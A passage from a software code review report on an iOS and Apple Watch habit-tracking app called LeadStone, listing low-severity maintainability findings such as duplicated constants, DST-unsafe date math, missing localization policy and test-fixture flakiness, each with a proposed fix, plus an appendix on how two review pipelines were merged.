**Fix.** Add one sentence to README.md (and CLAUDE.md's overview) — e.g. "Ships under the display name LeadStone; 'lead track' is the internal project/scheme/bundle name." — so the canonical-name question is answered in-repo.


<a id="f-134"></a>
#### ⚪ INFO · `Shared/Models/Aspiration.swift:121`

**find(stableID:in:) fetch logic duplicated verbatim between Aspiration and Metric**

Aspiration.find(stableID:in:) (Aspiration.swift:121-130) and Metric.find(stableID:in:) (Metric.swift:241-250) are character-for-character the same FetchDescriptor + fetchLimit=1 + first pattern. Four more models (Intention, Moment, Principle, AspirationCheckIn) carry the same stableID: UUID? + #Unique convention, so a third and fourth copy is the natural next step when deep links grow.

**Fix.** Introduce a small protocol (e.g. `protocol StableIdentified: PersistentModel { var stableID: UUID? { get } }`) with one generic `find(stableID:in:)` implementation guarded by #if canImport(SwiftData), and delete the per-type copies.


<a id="f-135"></a>
#### ⚪ INFO · `Shared/Models/Intention.swift:151`

**Hard-coded 7*24*3600 week fallback is DST-incorrect and duplicated**

weekInterval's fallback `DateInterval(start: weekStart, duration: 7 * 24 * 3600)` assumes every week is exactly 168 hours (false in any DST week) and the identical expression is repeated in MarkdownExportWindow.swift:115. The fallback path is nearly unreachable (dateInterval(of:for:) essentially never fails for .weekOfYear), which makes it silent dead-ish code that still gets copied around as the blessed pattern.

**Fix.** Centralize one fallback helper (e.g. `DateInterval.approximateWeek(startingAt:)`) or drop the fallback and make the impossibility explicit with a preconditionFailure-style comment; either way stop re-deriving 604800 at each call site.


<a id="f-136"></a>
#### ⚪ INFO · `Shared/Services/AspirationAlignment.swift:27`

**series(from:calendar:) accepts a calendar parameter it deliberately ignores**

The signature advertises calendar awareness (`calendar _: Calendar = .current`) but the underscore discards it — grouping is purely by the stored `weekStart`. A caller passing a non-current calendar (as the same type's other functions genuinely honor) reasonably expects it to matter; the dead parameter is misleading API surface and will confuse the next person threading calendars through this file.

**Fix.** Drop the parameter entirely (callers using the default need no change), or actually use it if week normalization is ever needed here; a doc comment explaining why the calendar is irrelevant would also do.


<a id="f-137"></a>
#### ⚪ INFO · `Shared/Services/ComplicationProgress.swift:30`

**hasDailyTarget is the third hand-copy of the binary show-up rule, kept in sync only by comments**

`measurementType == .binary ? binaryGoalRetiredAt == nil : dailyGoal != nil` restates Metric.expectsDailyShowUp (Metric.swift:262) and GoalSummary.hasDailyTarget (GoalSummary.swift:60). The doc comment says "Mirrors GoalSummary", which is honest but is the only synchronization mechanism; a change to how retirement works (e.g. a reinstated-at date) must now be found in three places across two targets, and a miss makes the watch complication disagree with the phone's rings.

**Fix.** Extract one free function over the raw fields, e.g. `DailyTarget.exists(measurementType:binaryGoalRetiredAt:dailyGoal:)` in Shared, and have Metric, GoalSummary, and ComplicationMetricProgress all call it.


<a id="f-138"></a>
#### ⚪ INFO · `Shared/Services/NotificationService+IntentionQuestions.swift:17`

**cancelQuestion's slot count is only coincidentally aligned with the planner's day loop**

cancelQuestion removes IDs for indices 0..<questionSlotCount (7), while the actual number of scheduled slots is determined independently by IntentionQuestionPlanner.remainingDays' hard-coded `(0 ..< 7)` loop in another file. Nothing ties the two constants together: if the planner ever produced more entries (e.g. an 8-day DST-week guard, or a two-asks-per-day feature), scheduleQuestion would create IDs cancelQuestion never removes, leaking pending notifications for deleted aspirations until the next foreground sweep — exactly the gap the explicit cancel exists to cover.

**Fix.** Expose one shared constant (e.g. IntentionQuestionPlanner.maxSlotsPerWeek) that both the planner's day loop and questionSlotCount reference, mirroring how cancelForMetric already derives its range from ReminderSchedule.maxPerDay.


<a id="f-139"></a>
#### ⚪ INFO · `Shared/Services/WatchSnapshotCache.swift:22`

**Silent fallback to UserDefaults.standard masks app-group misconfiguration**

When the app-group suite cannot be created (missing/renamed entitlement, wrong AppGroup.id), the cache silently falls back to .standard. The watch app and its widget extension would then each read and write their own private cache with no error, log, or assertion — the widget shows stale or empty data while the app looks fine, and the root cause (an entitlement problem) is invisible. The file's own doc comment says the shared app group is the point ('so the watch widget extension can render the same state'), so the fallback defeats the design rather than degrading it gracefully.

**Fix.** Log (or assertionFailure in DEBUG) when UserDefaults(suiteName:) returns nil so a broken app-group entitlement is caught in development instead of shipping as a mysteriously stale widget.


<a id="f-140"></a>
#### ⚪ INFO · `Shared/Theme.swift:59`

**Confirmed: MetricColorTests' duplicated background constants exactly match Theme.warmNeutral today**

Verification for the existing finding that referenced Theme's constants unread: warmNeutral adds +0.018 red and +0.008 green over the base gray (Theme.swift:62-67), so screenBackground = warmNeutral(dark: 0.055, light: 0.96) resolves to light (0.978, 0.968, 0.96) and dark (0.073, 0.063, 0.055) — identical to the values hardcoded at lead trackTests/MetricColorTests.swift:51-52, and the test comment documents the derivation ('gray 0.96 (light) and 0.055 (dark) plus the +0.018/+0.008 red/green warmth — restated here because Theme itself is SwiftUI-only'). The duplication is currently in sync but has no compile-time link: a Theme restyle would silently leave the WCAG contrast tests validating the old surfaces. Note the contrast tests restate only screenBackground; cardBackground (warmNeutral 0.12/0.995, Theme.swift:22) has no contrast assertion, which is acceptable since ink is measured against the screen background. Theme.swift is otherwise benign styling, whole-file-guarded with #if canImport(SwiftUI) per the project's cross-platform convention.

**Fix.** No code change strictly required; if desired, extract the warmth offsets (0.018/0.008) and the two base grays into a platform-neutral constant (plain Doubles compile on Linux) that both Theme and MetricColorTests read, eliminating the silent-drift risk the existing finding describes.


<a id="f-141"></a>
#### ⚪ INFO · `docs/ASPIRATIONS.md:250`

**ASPIRATIONS.md v1 navigation spec and out-of-scope list are superseded with no historical marker**

Lines 250-257 specify 'Introduce a TabView at the ContentView root with two tabs' (Today, Aspirations); the shipping ContentView has three tabs (Today, Week, Aspirations) on a page-style TabView with a custom AppTabBar. The out-of-scope list (lines 307-317) defers 'Notifications / reminders tied to aspirations' and 'Insight engine / Weekly Review integration' — both since shipped (intention daily-question notifications deep-link into aspiration detail; WeeklyReview builds aspiration weeks, check-ins, moments, goal seasons). The doc is framed as 'the v1 requirements' but carries no superseded/historical banner, and other normative docs (MOMENTS.md, ASPIRATION_STEERING.md) cite it as current grounding, so a reader can't tell which claims still bind. The core invariants I spot-checked (target-free, live rollup, 30-day recent window, unit-bucketed breakdown) do still match AspirationRollup.

**Fix.** Add a short status header ('v1 spec, shipped; navigation and out-of-scope items superseded — see code') or update the navigation and out-of-scope sections to reflect the three-tab shell and shipped review/notification integrations.


<a id="f-142"></a>
#### ⚪ INFO · `lead track.xcodeproj/project.pbxproj:512`

**No localization infrastructure anywhere; English-only status is undocumented and locale bugs are being fixed one view at a time**

The repo contains zero localization plumbing: no .xcstrings, no .lproj, no .strings/.stringsdict, and not a single String(localized:), NSLocalizedString, or explicit LocalizedStringKey in any target (verified by find/grep across the tree). knownRegions in the pbxproj is the default (en/Base). Meanwhile user-facing copy is hard-coded across the iOS app, NotificationService (Shared/Services/NotificationService.swift:89-90, 217, 266-269, 279-281), both widget extensions (lead-track Widget/ScoreboardWidget.swift:135 "No metrics yet", :255-256 configurationDisplayName/description; lead-track Watch Widget/WatchTimerWidget.swift:101), the watch app (lead-track Watch App/WatchRootView.swift:36), DurationFormatter's hard-coded h/m/s unit letters, and the markdown/CSV exports. The review filed three independent locale point-findings (CountEntryView comma-decimal parsing, DetailedStatisticsView %.1f, AspirationWeekDetailView '1 days') without surfacing that they are symptoms of this one systemic decision never having been made explicit.

**Fix.** Decide and record the policy. If English-only is deliberate (plausible for a personal app), state it in CLAUDE.md/README so reviewers stop filing per-view i18n findings — but still audit locale-SENSITIVE (not language) code as a class, because device region breaks English-only apps too: grep for `Double(` on TextField text, `String(format:` on displayed floats, and interpolated plural nouns (see companion findings). If localization is intended, adopt a String Catalog now while the string count is still manageable; every new hard-coded literal increases the migration cost.


<a id="f-143"></a>
#### ⚪ INFO · `lead track/lead_trackApp.swift:10`

**Magic launch-argument string "-uitest" duplicated in three targets**

The literal "-uitest" is independently spelled in lead_trackApp.swift:10, AppLockService.swift:37, and lead trackUITests/LeadTrackUITests.swift:42. A typo in any one silently breaks UI-test isolation (persistent store used in tests, or app lock engaging during UI tests) rather than failing to compile.

**Fix.** Centralize it, e.g. `enum LaunchArguments { static let uiTest = "-uitest"; static var isUITest: Bool { ProcessInfo.processInfo.arguments.contains(uiTest) } }`, and reference it from all three places.


<a id="f-144"></a>
#### ⚪ INFO · `lead trackTests/AspirationWeekDetailTests.swift:26`

**~90 lines of fixture builders duplicated verbatim across four aspiration test suites**

day(_:), makeAspiration, makeMetric, makeProject, addDuration/addCount, register and attach are copy-pasted nearly identically across AspirationWeekDetailTests, AspirationWeekTests, AspirationRollupTests and AspirationAlignmentTests (each with the same dual-platform #if branches). A change to Session/Metric initializers or to the register pattern must be repeated four times, and the copies have already drifted slightly (register's optional-project parameter differs between files). The dual-platform fork itself is the deliberate convention — the duplication of it is the smell.

**Fix.** Extract a shared test-support fixture (e.g. a `ModelFixture` struct owning the optional ModelContext plus the make/add helpers) in a file compiled into the test target on both platforms, and have the suites hold one instance.


<a id="f-145"></a>
#### ⚪ INFO · `lead-track Watch App/WatchLogView.swift:56`

**Crown-amount bounds 1...999 duplicated between the crown binding and the +/- button clamp**

The valid amount range appears twice in the same view: digitalCrownRotation($amount, from: 1, through: 999, ...) at lines 42-43 and the manual clamp 'min(max(amount + change, 1), 999)' in adjustButton at line 56. Changing the ceiling (or making it per-metric) requires editing both, and nothing ties them together — the classic way these silently diverge.

**Fix.** Introduce 'private static let amountRange: ClosedRange<Double> = 1...999' and use it for both the crown binding (from: amountRange.lowerBound, through: amountRange.upperBound) and the button clamp (e.g. 'amount = (amount + change).clamped(to: Self.amountRange)' or min/max against the range's bounds).


<a id="f-146"></a>
#### ⚪ INFO · `lead-track Watch Widget/SelectWatchMetricIntent.swift:28`

**Metric icon fallback policy re-derived in four places and inconsistent between watch app and widgets**

The watch app's WatchMetricLabel uses a measurement-type-aware default icon ('timer' / 'number' / 'checkmark.circle', WatchMetricLabel.swift lines 54-60), while the widget side hard-codes '?? "clock"' in three independent spots: SelectWatchMetricIntent.swift:28, WatchTimerWidget.swift:80, and Shared/Services/ComplicationProgress.swift:121. A duration metric with no icon therefore shows 'timer' in the app list but 'clock' on every complication. The iOS side already solved this with 'Metric.displayIcon' (Shared/Models/Metric.swift:218), but WatchMetricSnapshot has no equivalent, so each watch consumer reinvents the fallback.

**Fix.** Add a 'displayIcon' computed property to WatchMetricSnapshot (in Shared/Models/WatchSnapshot.swift) that encodes the chosen fallback policy once — ideally the type-aware one from WatchMetricLabel — and replace all four call sites (WatchMetricLabel.defaultIcon can be deleted).


<a id="f-147"></a>
#### ⚪ INFO · `lead-track Watch Widget/WatchGoalsWidget.swift:158`

**Shared sample/preview data for ComplicationMetricProgress is buried at the bottom of WatchGoalsWidget.swift but used by another widget**

The 'extension ComplicationMetricProgress { static let sample; static let sampleLines }' block (lines 158-202) lives in WatchGoalsWidget.swift, yet '.sample' is consumed by WatchMetricProvider.placeholder in WatchMetricWidget.swift:15. This is hidden coupling: someone refactoring or deleting the Goals widget file would unexpectedly break the Metric widget's placeholder, and nobody looking for ComplicationMetricProgress fixtures would think to open WatchGoalsWidget.swift (the type itself is defined in Shared/Services/ComplicationProgress.swift).

**Fix.** Move the sample-data extension to its own file in the widget target (e.g. 'lead-track Watch Widget/ComplicationSampleData.swift') or alongside the type in Shared, so each widget file owns only its own widget.



**testing**

<a id="f-154"></a>
#### ⚪ INFO · `lead trackTests/DurationFormatterTests.swift:5`

**Ten copy-paste single-assert tests should be parameterized; format() lacks the negative-input case compact() has**

DurationFormatterTests is ten structurally identical one-line tests (input → expected string). swift-testing's `@Test(arguments:)` with (TimeInterval, String) pairs would collapse them, make each case report individually, and make gaps visible. One such gap exists now: `compactTruncatesSubMinuteAndNegative` pins compact(-30), but `format(_:)` is never fed a negative or fractional value, so its behavior on a clock-skewed negative duration is unpinned. The same pattern (parameterizable literal tables) recurs in ExportRangeTests.labelsSpellTheCountAndDropItAtOne and the rawValuesStayStable tests in HealthMetricTests/HealthExportTests, though those are milder.

**Fix.** Convert to `@Test(arguments: [(45, "45s"), (125, "2m 05s"), ...])` and add (-30, expected) and a fractional-seconds row for format(). Mind the project's SwiftFormat rules when writing the tuples.


<a id="f-155"></a>
#### ⚪ INFO · `lead trackTests/MarkdownExportWeeksTests.swift:28`

**Fixture date helpers recompute the 'now' anchor per call, so a midnight crossing mid-test skews fixtures**

The midnight-anchored day(_:) pattern is the project's chosen anti-flake convention and is fine per se, but nearly every suite's helper recomputes calendar.startOfDay(for: .now) on each invocation (here, addDuration(600, ..., at: day(2)) runs before build(), and heading(2) is evaluated after). A test that starts at 23:59:59.x and crosses midnight between those calls builds sessions on one day grid and asserts against another (e.g. emptyDaysBetweenLoggedDaysAreOmitted's !markdown.contains(heading(1)) inverts). The same shape recurs in WeeklyReviewTests, MeasureHealthTests, TodayCluster*, MomentWeekTests, and SessionStatisticsTests (whose currentStreak additionally reads the real .now inside the code under test).

**Fix.** Capture the anchor once per test struct (let anchor = Calendar.current.startOfDay(for: .now) as a stored property, computed once in init) and derive every day(_:) / weekday(of:) from it, so a mid-test midnight cannot split the fixture and the assertions.



---

## Appendix — provenance & how to read this

- **Review A** is the artifact *"LeadStone code review · July 2026"* (156 confirmed findings after a
  199-agent verified pipeline). Its findings are reproduced in full in §5 with their original severities.
- **Review B** is this session's `/code-review` max-effort pass; its net-new findings are in §2 (`B-*`), its
  corrections in §3 (`C-*`), and its corroborations of Review A are flagged 🔁 inline.
- **Confidence ordering:** items marked 🔁 (both pipelines) > single-pipeline Confirmed > the
  PLAUSIBLE/latent items each review flagged as such in their notes.
- **Suggested starting order** (both reviews agree): the watch-sync protocol hardening
  ([f-0](#f-0)/[f-5](#f-5)/[f-6](#f-6)/[f-11](#f-11) — one protocol fix: action IDs + a snapshot generation
  counter + raw-string enums on the wire), the CSV importer/exporter ([f-1](#f-1)/[f-12](#f-12)/[f-93](#f-93)/
  [B-11](#B-11)), then decide the intent of the PR #72 regression ([B-1](#B-1)).
